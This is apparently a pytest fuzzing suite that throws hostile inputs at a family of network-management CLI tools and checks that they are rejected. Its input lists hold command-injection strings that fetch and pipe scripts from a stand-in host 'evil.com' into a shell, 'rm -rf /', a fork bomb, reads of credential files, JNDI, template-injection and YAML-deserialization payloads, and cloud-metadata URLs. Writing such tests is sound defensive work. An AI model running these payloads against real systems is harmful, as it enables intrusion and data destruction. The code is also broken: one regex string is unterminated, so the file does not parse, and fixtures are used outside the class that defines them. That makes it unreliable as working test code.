#!/usr/bin/env python3
"""
LNMT CLI Fuzzing Test Suite
Comprehensive parameter validation and edge case testing for all CLI tools
"""

import pytest
import subprocess
import tempfile
import os
import json
import yaml
import random
import string
from pathlib import Path
from unittest.mock import patch, Mock
import signal
import time

class TestCLIFuzzingCore:
    """Core fuzzing functionality for all CLI tools"""
    
    @pytest.fixture
    def cli_tools(self):
        """List of all LNMT CLI tools"""
        return [
            'authctl_cli.py',
            'backup_cli.py', 
            'device_tracker_cli.py',
            'healthctl_cli.py',
            'integrations_cli.py',
            'reportctl_cli.py',
            'schedctl_cli.py',
            'vlanctl_cli.py'
        ]
    
    @pytest.fixture
    def malicious_inputs(self):
        """Comprehensive malicious input collection"""
        return [
            # Command injection
            "; rm -rf /",
            "& shutdown -h now",
            "| cat /etc/passwd",
            "&& curl evil.com/malware.sh | sh",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/proc/self/environ",
            "file:///etc/hosts",
            
            # Buffer overflow attempts
            "A" * 10000,
            "X" * 65536,
            "\x00" * 1024,
            
            # Format string attacks
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            
            # Script injection
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "vbscript:msgbox(1)",
            "${jndi:ldap://evil.com/a}",
            
            # Special characters and encoding
            "\r\n\r\nHTTP/1.1 200 OK\r\n",
            "\x00\x01\x02\x03\x04\x05",
            "café🦄\u2028\u2029",
            "%c0%af%c0%af",
            
            # SQL injection variants
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "1' UNION SELECT * FROM sensitive--",
            
            # XML/XXE
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            
            # LDAP injection
            "*)(&(objectClass=*)",
            "*)(uid=*))(|(uid=*",
            
            # NoSQL injection
            "{'$ne': null}",
            "{'$gt': ''}",
            "';return 'a'=='a' && ''=='",
        ]
    
    @pytest.fixture
    def edge_case_inputs(self):
        """Edge case inputs for boundary testing"""
        return [
            "",  # Empty string
            " ",  # Whitespace only
            "\t\n\r",  # Control characters
            None,  # Null value
            "0",  # Zero
            "-1",  # Negative
            "2147483648",  # Integer overflow
            "999999999999999999999",  # Very large number
            "0.0",  # Float zero
            "1e308",  # Large float
            "NaN",  # Not a number
            "Infinity",  # Infinity
            "true", "false",  # Booleans as strings
            "[]", "{}", "()",  # Empty containers
            "null", "undefined",  # Null representations
        ]

class TestAuthCLIFuzzing:
    """Fuzzing tests for authctl_cli.py"""
    
    def run_authctl(self, args, expect_success=False):
        """Helper to run authctl with error handling"""
        try:
            cmd = ['python3', 'cli/authctl_cli.py'] + args
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=30,
                cwd='.'
            )
            
            if expect_success:
                assert result.returncode == 0, f"Command failed: {result.stderr}"
            else:
                # Should fail gracefully, not crash
                assert result.returncode != -11, "Command segfaulted"  # SIGSEGV
                assert result.returncode != -6, "Command aborted"     # SIGABRT
                
            return result
        except subprocess.TimeoutExpired:
            pytest.fail("Command timed out - potential infinite loop")
        except Exception as e:
            pytest.fail(f"Unexpected error running command: {e}")

    def test_user_creation_fuzzing(self, malicious_inputs, edge_case_inputs):
        """Fuzz user creation parameters"""
        all_inputs = malicious_inputs + edge_case_inputs
        
        for username in all_inputs[:10]:  # Limit for performance
            for password in all_inputs[:5]:
                result = self.run_authctl(['create-user', str(username), str(password)])
                
                # Should handle gracefully
                assert "Traceback" not in result.stderr, f"Python traceback with input: {username}, {password}"
                assert "Segmentation fault" not in result.stderr, "Segmentation fault detected"

    def test_permission_fuzzing(self, malicious_inputs):
        """Fuzz permission modification commands"""
        for permission in malicious_inputs[:15]:
            result = self.run_authctl(['set-permission', 'testuser', str(permission)])
            
            # Should reject invalid permissions securely
            assert result.returncode != 0, f"Should reject malicious permission: {permission}"
            assert "error" in result.stderr.lower() or "invalid" in result.stderr.lower()

    def test_config_file_fuzzing(self):
        """Fuzz configuration file parsing"""
        malicious_configs = [
            # JSON injection
            '{"admin": true, "user": "hacker"}',
            '{"password": ""; system("rm -rf /"); "": ""}',
            
            # Malformed JSON
            '{"unclosed": "string}',
            '{"trailing": "comma",}',
            '{nested: {deeply: {very: {deeply}}}}' * 100,
            
            # Binary data
            '\x89PNG\r\n\x1a\n',  # PNG header
            'GIF89a',  # GIF header
            '\xff\xfe',  # UTF-16 BOM
        ]
        
        for config_data in malicious_configs:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                f.write(config_data)
                config_file = f.name
            
            try:
                result = self.run_authctl(['--config', config_file, 'list-users'])
                
                # Should handle malformed config gracefully
                assert "Traceback" not in result.stderr, f"Python traceback with config: {config_data[:50]}"
            finally:
                os.unlink(config_file)

class TestBackupCLIFuzzing:
    """Fuzzing tests for backup_cli.py"""
    
    def run_backup_cli(self, args):
        """Helper to run backup CLI"""
        try:
            cmd = ['python3', 'cli/backup_cli.py'] + args
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result
        except subprocess.TimeoutExpired:
            pytest.fail("Backup command timed out")

    def test_backup_path_fuzzing(self, malicious_inputs):
        """Fuzz backup path parameters"""
        for path in malicious_inputs:
            result = self.run_backup_cli(['create', str(path)])
            
            # Should prevent path traversal
            assert result.returncode != 0 or "error" in result.stderr.lower()
            assert "permission denied" in result.stderr.lower() or "invalid path" in result.stderr.lower()

    def test_restore_fuzzing(self, malicious_inputs):
        """Fuzz restore operations"""
        # Create malicious backup files
        malicious_files = [
            b'\x00' * 1000,  # Null bytes
            b'PK\x03\x04' + b'A' * 1000,  # Fake ZIP
            b'BZh91AY&SY' + b'\xff' * 100,  # Fake bzip2
            b'\x1f\x8b\x08' + b'X' * 500,  # Fake gzip
        ]
        
        for file_data in malicious_files:
            with tempfile.NamedTemporaryFile(delete=False) as f:
                f.write(file_data)
                backup_file = f.name
            
            try:
                result = self.run_backup_cli(['restore', backup_file])
                
                # Should detect and reject malicious files
                assert result.returncode != 0, "Should reject malicious backup files"
                assert "error" in result.stderr.lower() or "invalid" in result.stderr.lower()
            finally:
                os.unlink(backup_file)

class TestNetworkCLIFuzzing:
    """Fuzzing tests for network-related CLI tools (DNS, VLAN, Device Tracker)"""
    
    def test_dns_record_fuzzing(self, malicious_inputs):
        """Fuzz DNS record manipulation"""
        dns_cli = ['python3', 'cli/dns_manager_cli.py']
        
        for hostname in malicious_inputs[:10]:
            for ip_addr in malicious_inputs[:5]:
                try:
                    result = subprocess.run(
                        dns_cli + ['add-record', str(hostname), str(ip_addr)],
                        capture_output=True, text=True, timeout=30
                    )
                    
                    # Should validate DNS records properly
                    if result.returncode == 0:
                        # If accepted, verify it's actually valid
                        assert self.is_valid_dns_entry(hostname, ip_addr), f"Invalid DNS entry accepted: {hostname} -> {ip_addr}"
                
                except subprocess.TimeoutExpired:
                    pass  # Timeout is acceptable for malicious input

    def test_vlan_id_fuzzing(self, edge_case_inputs):
        """Fuzz VLAN ID parameters"""
        vlan_cli = ['python3', 'cli/vlanctl_cli.py']
        
        for vlan_id in edge_case_inputs:
            try:
                result = subprocess.run(
                    vlan_cli + ['create-vlan', str(vlan_id)],
                    capture_output=True, text=True, timeout=30
                )
                
                # VLAN IDs should be 1-4094
                if result.returncode == 0:
                    vlan_num = int(vlan_id) if str(vlan_id).isdigit() else -1
                    assert 1 <= vlan_num <= 4094, f"Invalid VLAN ID accepted: {vlan_id}"
                    
            except (ValueError, subprocess.TimeoutExpired):
                pass  # Expected for invalid inputs

    def test_device_mac_fuzzing(self, malicious_inputs):
        """Fuzz MAC address inputs for device tracker"""
        device_cli = ['python3', 'cli/device_tracker_cli.py']
        
        for mac_addr in malicious_inputs[:15]:
            try:
                result = subprocess.run(
                    device_cli + ['track-device', str(mac_addr)],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should validate MAC address format
                if result.returncode == 0:
                    assert self.is_valid_mac_address(mac_addr), f"Invalid MAC address accepted: {mac_addr}"
                    
            except subprocess.TimeoutExpired:
                pass

    def is_valid_dns_entry(self, hostname, ip_addr):
        """Validate DNS entry"""
        import re
        hostname_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        
        return re.match(hostname_pattern, str(hostname)) and re.match(ip_pattern, str(ip_addr))

    def is_valid_mac_address(self, mac):
        """Validate MAC address format"""
        import re
        mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        return re.match(mac_pattern, str(mac))

class TestSchedulerCLIFuzzing:
    """Fuzzing tests for schedctl_cli.py"""
    
    def test_cron_expression_fuzzing(self, malicious_inputs):
        """Fuzz cron expression parsing"""
        sched_cli = ['python3', 'cli/schedctl_cli.py']
        
        # Malicious cron expressions
        malicious_crons = [
            "* * * * * rm -rf /",  # Command injection in cron
            "0 0 * * * ${IFS}cat${IFS}/etc/passwd",  # Shell injection
            "* * * * * `curl evil.com/shell.sh`",  # Command substitution
            "*/1 * * * * :(){ :|:& };:",  # Fork bomb
            "0 0 * * * python -c 'import os; os.system(\"rm -rf /\")'",  # Python injection
            "* * * * *" + "A" * 10000,  # Buffer overflow
            "60 25 32 13 8",  # Invalid ranges
            "-1 -1 -1 -1 -1",  # Negative values
            "*/0 */0 */0 */0 */0",  # Division by zero
            "a b c d e",  # Non-numeric
            "@reboot rm -rf /",  # Special time with command
            "",  # Empty
            " " * 100,  # Whitespace only
        ]
        
        for cron_expr in malicious_crons:
            try:
                result = subprocess.run(
                    sched_cli + ['add-job', 'test_job', cron_expr, 'echo hello'],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should reject malicious cron expressions
                if result.returncode == 0:
                    # If accepted, verify it's actually valid
                    assert self.is_valid_cron(cron_expr), f"Invalid cron expression accepted: {cron_expr}"
                
            except subprocess.TimeoutExpired:
                pass  # Timeout acceptable for malicious input

    def test_job_command_fuzzing(self, malicious_inputs):
        """Fuzz job command parameters"""
        sched_cli = ['python3', 'cli/schedctl_cli.py']
        
        for command in malicious_inputs[:20]:
            try:
                result = subprocess.run(
                    sched_cli + ['add-job', 'fuzz_job', '0 0 * * *', str(command)],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should sanitize or reject dangerous commands
                if result.returncode == 0:
                    # Verify command is properly sanitized
                    assert not any(danger in str(command) for danger in ['rm -rf', 'dd if=', 'mkfs', 'shutdown'])
                    
            except subprocess.TimeoutExpired:
                pass

    def is_valid_cron(self, cron_expr):
        """Basic cron expression validation"""
        try:
            parts = cron_expr.strip().split()
            if len(parts) != 5:
                return False
            
            # Basic range checks
            ranges = [(0, 59), (0, 23), (1, 31), (1, 12), (0, 7)]
            for part, (min_val, max_val) in zip(parts, ranges):
                if part == '*':
                    continue
                if part.isdigit():
                    val = int(part)
                    if not (min_val <= val <= max_val):
                        return False
            return True
        except:
            return False

class TestReportCLIFuzzing:
    """Fuzzing tests for reportctl_cli.py"""
    
    def test_report_generation_fuzzing(self, malicious_inputs):
        """Fuzz report generation parameters"""
        report_cli = ['python3', 'cli/reportctl_cli.py']
        
        for report_type in malicious_inputs[:10]:
            for output_file in malicious_inputs[:5]:
                try:
                    result = subprocess.run(
                        report_cli + ['generate', str(report_type), '--output', str(output_file)],
                        capture_output=True, text=True, timeout=30
                    )
                    
                    # Should validate report types and output paths
                    if result.returncode == 0:
                        # Verify output file is in safe location
                        safe_output = self.is_safe_output_path(output_file)
                        assert safe_output, f"Unsafe output path accepted: {output_file}"
                        
                except subprocess.TimeoutExpired:
                    pass

    def test_template_injection_fuzzing(self):
        """Test for template injection vulnerabilities in reports"""
        template_injections = [
            "{{7*7}}",  # Jinja2 template injection
            "${7*7}",   # String template injection
            "<%=7*7%>", # ERB template injection
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",  # Spring template injection
            "#{7*7}",   # Ruby interpolation
            "${{7*7}}",  # Dollar brace injection
        ]
        
        for injection in template_injections:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({"title": injection, "data": "test"}, f)
                template_file = f.name
            
            try:
                result = subprocess.run(
                    ['python3', 'cli/reportctl_cli.py', 'generate', '--template', template_file],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should not execute template injections
                assert "49" not in result.stdout, f"Template injection executed: {injection}"
                
            finally:
                os.unlink(template_file)

    def is_safe_output_path(self, path):
        """Check if output path is safe"""
        dangerous_paths = [
            '/etc/', '/bin/', '/usr/bin/', '/sbin/',
            '/boot/', '/dev/', '/proc/', '/sys/',
            'C:\\Windows\\', 'C:\\Program Files\\',
            '../', '..\\', '/root/', 'C:\\Users\\Administrator\\'
        ]
        
        path_str = str(path)
        return not any(danger in path_str for danger in dangerous_paths)

class TestHealthCLIFuzzing:
    """Fuzzing tests for healthctl_cli.py"""
    
    def test_service_name_fuzzing(self, malicious_inputs):
        """Fuzz service name parameters"""
        health_cli = ['python3', 'cli/healthctl_cli.py']
        
        for service_name in malicious_inputs[:15]:
            try:
                result = subprocess.run(
                    health_cli + ['check-service', str(service_name)],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should validate service names
                if result.returncode == 0:
                    # Verify service name is legitimate
                    assert self.is_valid_service_name(service_name), f"Invalid service name accepted: {service_name}"
                    
            except subprocess.TimeoutExpired:
                pass

    def test_metrics_fuzzing(self):
        """Fuzz metrics collection parameters"""
        health_cli = ['python3', 'cli/healthctl_cli.py']
        
        metric_injections = [
            "cpu'; DROP TABLE metrics; --",
            "memory || cat /etc/passwd",
            "disk && rm -rf /tmp/*",
            "network; curl evil.com/exfiltrate.sh | sh",
            "../../../proc/version",
            "/dev/zero",
            "/proc/self/mem",
        ]
        
        for metric in metric_injections:
            try:
                result = subprocess.run(
                    health_cli + ['collect-metric', metric],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should reject malicious metric names
                assert result.returncode != 0, f"Malicious metric accepted: {metric}"
                
            except subprocess.TimeoutExpired:
                pass

    def is_valid_service_name(self, name):
        """Validate service name format"""
        import re
        # Service names should be alphanumeric with hyphens/underscores
        pattern = r'^[a-zA-Z0-9_-]+
        return re.match(pattern, str(name)) and len(str(name)) < 100

class TestIntegrationCLIFuzzing:
    """Fuzzing tests for integrations_cli.py"""
    
    def test_integration_config_fuzzing(self):
        """Fuzz integration configuration"""
        integration_cli = ['python3', 'cli/integrations_cli.py']
        
        malicious_configs = [
            # YAML injection
            "!!python/object/apply:os.system ['rm -rf /']",
            "!!python/object/apply:subprocess.check_output [['id']]",
            
            # JSON injection with functions
            '{"exec": "require(\'child_process\').exec(\'rm -rf /\')"}',
            
            # Deserialization attacks
            "!!python/object/apply:eval ['__import__(\"os\").system(\"id\")']",
            
            # File inclusion
            "config: !include /etc/passwd",
            "data: !include ../../etc/shadow",
        ]
        
        for config_data in malicious_configs:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
                f.write(config_data)
                config_file = f.name
            
            try:
                result = subprocess.run(
                    integration_cli + ['load-config', config_file],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should reject malicious YAML/JSON
                assert result.returncode != 0, f"Malicious config accepted: {config_data}"
                
            finally:
                os.unlink(config_file)

    def test_webhook_url_fuzzing(self, malicious_inputs):
        """Fuzz webhook URL parameters"""
        integration_cli = ['python3', 'cli/integrations_cli.py']
        
        malicious_urls = [
            "file:///etc/passwd",
            "ftp://evil.com/steal_data",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "http://localhost:22/ssh_attack",
            "http://169.254.169.254/metadata",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "ldap://evil.com/cn=admin",
            "dict://localhost:11211/stats",  # Memcached
        ]
        
        for url in malicious_urls:
            try:
                result = subprocess.run(
                    integration_cli + ['add-webhook', url],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should validate and restrict webhook URLs
                assert result.returncode != 0, f"Malicious webhook URL accepted: {url}"
                
            except subprocess.TimeoutExpired:
                pass

class TestCLIPerformanceFuzzing:
    """Performance and resource exhaustion fuzzing tests"""
    
    def test_memory_exhaustion_protection(self, cli_tools):
        """Test protection against memory exhaustion"""
        large_input = "X" * (10 * 1024 * 1024)  # 10MB input
        
        for cli_tool in cli_tools[:3]:  # Test subset for performance
            try:
                result = subprocess.run(
                    ['python3', f'cli/{cli_tool}', '--input', large_input],
                    capture_output=True, text=True, timeout=30
                )
                
                # Should handle large inputs gracefully
                assert "MemoryError" not in result.stderr, f"Memory error in {cli_tool}"
                
            except subprocess.TimeoutExpired:
                pass  # Timeout is acceptable protection

    def test_cpu_exhaustion_protection(self):
        """Test protection against CPU exhaustion attacks"""
        # Test with inputs designed to cause exponential complexity
        evil_regex_patterns = [
            "a" * 1000 + "X",  # Against (a+)+X regex
            "(" * 1000 + "a" + ")" * 1000,  # Nested groups
            "a" * 10000,  # Very long string
        ]
        
        for pattern in evil_regex_patterns:
            try:
                result = subprocess.run(
                    ['python3', 'cli/device_tracker_cli.py', 'search', pattern],
                    capture_output=True, text=True, timeout=10  # Short timeout
                )
                
                # Should complete within reasonable time
                # If we get here, it didn't timeout - that's good
                
            except subprocess.TimeoutExpired:
                # Timeout protection worked
                pass

    def test_file_descriptor_exhaustion(self):
        """Test protection against file descriptor exhaustion"""
        # Try to exhaust file descriptors
        temp_files = []
        try:
            for i in range(1000):  # Try to create many temp files
                f = tempfile.NamedTemporaryFile(delete=False)
                temp_files.append(f.name)
                f.close()
                
                # Try to process file
                result = subprocess.run(
                    ['python3', 'cli/backup_cli.py', 'create', f.name],
                    capture_output=True, text=True, timeout=5
                )
                
                # Should handle file descriptor limits gracefully
                if "Too many open files" in result.stderr:
                    break  # Expected limit reached
                    
        finally:
            # Cleanup
            for temp_file in temp_files:
                try:
                    os.unlink(temp_file)
                except:
                    pass

class TestCLIConcurrencyFuzzing:
    """Concurrency and race condition fuzzing tests"""
    
    def test_concurrent_cli_execution(self, cli_tools):
        """Test concurrent execution of CLI tools"""
        import threading
        import queue
        
        results = queue.Queue()
        
        def run_cli_tool(tool):
            try:
                result = subprocess.run(
                    ['python3', f'cli/{tool}', '--help'],
                    capture_output=True, text=True, timeout=30
                )
                results.put((tool, result.returncode, result.stderr))
            except Exception as e:
                results.put((tool, -1, str(e)))
        
        # Run multiple CLI tools concurrently
        threads = []
        for tool in cli_tools:
            thread = threading.Thread(target=run_cli_tool, args=(tool,))
            threads.append(thread)
            thread.start()
        
        # Wait for all to complete
        for thread in threads:
            thread.join(timeout=60)
        
        # Check results
        while not results.empty():
            tool, returncode, stderr = results.get()
            assert returncode != -11, f"Segfault in concurrent execution: {tool}"
            assert "race condition" not in stderr.lower(), f"Race condition detected: {tool}"

    def test_signal_handling_fuzzing(self, cli_tools):
        """Test signal handling during CLI execution"""
        signals_to_test = [signal.SIGINT, signal.SIGTERM, signal.SIGHUP]
        
        for tool in cli_tools[:3]:  # Test subset
            for sig in signals_to_test:
                try:
                    # Start long-running command
                    proc = subprocess.Popen(
                        ['python3', f'cli/{tool}', 'long-operation'],  # Assume this exists
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    
                    # Let it run briefly
                    time.sleep(0.1)
                    
                    # Send signal
                    proc.send_signal(sig)
                    
                    # Wait for termination
                    stdout, stderr = proc.communicate(timeout=10)
                    
                    # Should terminate gracefully
                    assert proc.returncode != -11, f"Segfault on signal {sig} in {tool}"
                    
                except (subprocess.TimeoutExpired, ProcessLookupError, FileNotFoundError):
                    # These are acceptable - command may not exist or may have terminated
                    pass

if __name__ == "__main__":
    # Run with specific markers for different test categories
    pytest.main([
        __file__, 
        "-v", 
        "--tb=short",
        "-m", "not slow",  # Skip slow tests by default
        "--maxfail=10"     # Stop after 10 failures
    ])
